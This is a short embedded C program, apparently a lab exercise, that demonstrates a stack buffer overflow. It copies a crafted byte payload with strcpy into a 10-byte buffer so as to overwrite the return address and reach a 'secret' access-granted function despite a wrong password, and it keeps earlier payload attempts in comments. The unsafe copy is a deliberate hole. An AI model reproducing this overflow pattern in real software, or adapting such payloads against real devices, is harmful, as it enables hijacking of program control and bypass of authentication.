#include "Utils/utils.h"
#include <stdio.h>
#include <string.h>

static void secret(void) {
	printf("Access granted\r\n");
}

int main(void) {
	configClock();
	configUSART2(38400);

	static char const *pwd_store = "password";
	char attempt[10];
	
	// Try to overwrite the link register here so that secret() is run
	// even if the password is incorrect
	//strcpy(attempt, "password");
	//strcpy(attempt, "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\xFF\xFF\xFF\xFF\x0F\x10\x11\x12\x13\x14\x15\x16\x31\x24");
	strcpy(attempt, "          \xFF\xFF\x01\x08        \x31\x24");

	if (0 == strcmp(attempt, pwd_store)) {
		secret();
	}
}
